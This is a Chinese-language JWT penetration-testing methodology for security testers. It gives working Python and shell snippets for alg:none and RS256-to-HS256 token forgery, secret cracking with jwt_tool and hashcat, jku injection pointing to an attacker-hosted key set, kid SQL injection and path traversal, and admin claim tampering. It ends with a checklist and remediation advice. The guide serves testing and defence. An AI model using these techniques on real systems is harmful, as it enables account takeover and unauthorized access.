# JWT 安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 JWT（JSON Web Token）安全测试流程，帮助发现和利用 JWT 认证机制中的安全漏洞。

## 1.2 适用范围

本文档适用于使用 JWT 进行身份认证和会话管理的 Web 应用、API 接口和移动应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### JWT 原理简介

JWT 是一种开放标准（RFC 7519），用于在各方之间安全地传输信息作为 JSON 对象。JWT 由三部分组成：
- **Header**：令牌类型和签名算法
- **Payload**：声明（用户信息、过期时间等）
- **Signature**：用于验证令牌完整性

### 常见 JWT 漏洞

| 漏洞类型 | 描述 | 风险等级 |
|---------|------|---------|
| 算法混淆 | RS256 改为 HS256 | 高 |
| 无签名验证 | alg: none | 高 |
| 弱密钥爆破 | 密钥强度不足 | 中 - 高 |
| 过期时间绕过 | exp 声明被忽略 | 中 |
| 敏感信息泄露 | Payload 包含敏感数据 | 中 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 风险点 | 潜在危害 |
|---------|-------|---------|
| 用户认证 | JWT 令牌认证 | 账户接管 |
| API 认证 | API 访问令牌 | 未授权 API 访问 |
| 会话管理 | 会话令牌 | 会话劫持 |
| 微服务通信 | 服务间认证 | 服务冒充 |
| SSO 单点登录 | 跨域认证 | 多系统沦陷 |

## 2.3 漏洞发现方法

### 2.3.1 JWT 识别

**识别 JWT 令牌**

JWT 通常格式：`xxxxx.yyyyy.zzzzz`（三段 Base64URL 编码字符串）

```bash
# 在请求中查找 JWT
# Header 中
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Cookie 中
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# 请求参数中
POST /api/data
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**解码 JWT**

```bash
# 使用 jwt.io 在线解码
# 或使用命令行工具
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```

### 2.3.2 算法检测

**检测支持的算法**

```python
# 使用 jwt_tool 检测
python jwt_tool.py -t https://target.com/api -rc "eyJhbGciOi..."

# 手动测试算法混淆
# 1. 将 RS256 改为 HS256
# 2. 使用公钥作为 HMAC 密钥签名
```

### 2.3.3 密钥强度检测

```bash
# 使用 jwt_tool 进行密钥爆破
python jwt_tool.py -t https://target.com/api \
    -C -p common-passwords.txt \
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 使用 hashcat
hashcat -m 16500 jwt.txt wordlist.txt
```

## 2.4 漏洞利用方法

### 2.4.1 算法混淆攻击（RS256 → HS256）

```python
import jwt

# 1. 获取目标应用的公钥
public_key = """-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# 2. 创建恶意 Payload
payload = {
    "sub": "admin",
    "role": "admin",
    "iat": 1234567890
}

# 3. 使用公钥作为 HMAC 密钥，HS256 算法签名
token = jwt.encode(
    payload,
    public_key,
    algorithm='HS256'
)

# 4. 修改 Header 中的 alg 为 HS256
# 发送请求测试
```

### 2.4.2 无签名攻击（alg: none）

```python
import base64
import json

# 1. 创建 Header（alg: none）
header = {
    "alg": "none",
    "typ": "JWT"
}

# 2. 创建 Payload
payload = {
    "sub": "admin",
    "role": "admin"
}

# 3. 编码
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).rstrip(b'=').decode()

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).rstrip(b'=').decode()

# 4. 组合（无签名部分）
token = f"{header_b64}.{payload_b64}."
```

### 2.4.3 JWT 密钥爆破

```bash
# 使用 jwt_tool
python jwt_tool.py -t https://target.com/api \
    -C -p rockyou.txt \
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# 使用 hashcat
# 格式：header.payload.signature
hashcat -m 16500 jwt.txt wordlist.txt --force
```

### 2.4.4 JWT 注入

```python
# Header 注入
header = {
    "alg": "HS256",
    "typ": "JWT",
    "jku": "https://attacker.com/jwks.json"  # 注入 JWKS URL
}

# Payload 注入
payload = {
    "sub": "admin",
    "role": "admin",
    "__proto__": {"isAdmin": True}  # 原型污染
}
```

## 2.5 漏洞利用绕过方法

### 2.5.1 签名验证绕过

**技巧 1：KID 参数注入**

```python
# KID 指向本地密钥
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "static/key"
}

# KID SQL 注入
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "' OR '1'='1"
}

# KID 路径遍历
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../dev/null"
}
```

### 2.5.2 过期时间绕过

**技巧 2：修改 exp 声明**

```python
import time
import jwt

payload = {
    "sub": "admin",
    "exp": int(time.time()) + 999999999  # 设置超远过期时间
}

token = jwt.encode(payload, "secret", algorithm="HS256")
```

**技巧 3：忽略过期检查**

```python
# 有些库支持忽略过期检查
jwt.decode(token, "secret", algorithms=["HS256"], options={
    "verify_exp": False
})
```

### 2.5.3 声明篡改

```python
# 提升权限
payload = {
    "sub": "user123",
    "role": "user"  # 改为 "admin"
}

# 添加管理员声明
payload = {
    "sub": "user123",
    "isAdmin": True,
    "permissions": ["read", "write", "delete"]
}
```

---

# 第三部分：附录

## 3.1 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| jwt_tool | JWT 测试工具集 | https://github.com/ticarpi/jwt_tool |
| jwt.io | 在线解码/编码 | https://jwt.io/ |
| Burp Suite | JWT 编辑和重放 | https://portswigger.net/burp |
| hashcat | JWT 密钥爆破 | https://hashcat.net/hashcat/ |

## 3.2 JWT 测试检查清单

```
□ 解码 JWT，检查 Header 和 Payload 内容
□ 测试 alg: none 攻击
□ 测试 RS256 → HS256 算法混淆
□ 测试弱密钥爆破
□ 测试 KID 参数注入
□ 测试敏感信息泄露
□ 测试过期时间验证
□ 测试声明篡改
□ 测试 JWT 注入
□ 测试 JWKS 端点安全
```

## 3.3 修复建议

1. **使用强密钥** - 至少 256 位随机密钥
2. **验证算法** - 明确指定接受的算法，拒绝 none
3. **验证过期时间** - 始终检查 exp 声明
4. **使用短时效令牌** - 配合 Refresh Token 使用
5. **实施令牌吊销** - 支持令牌吊销机制
6. **避免敏感数据** - 不在 Payload 中存储敏感信息

---

**参考资源**：
- [OWASP Cheat Sheet: JSON Web Token](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt.io](https://jwt.io/)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
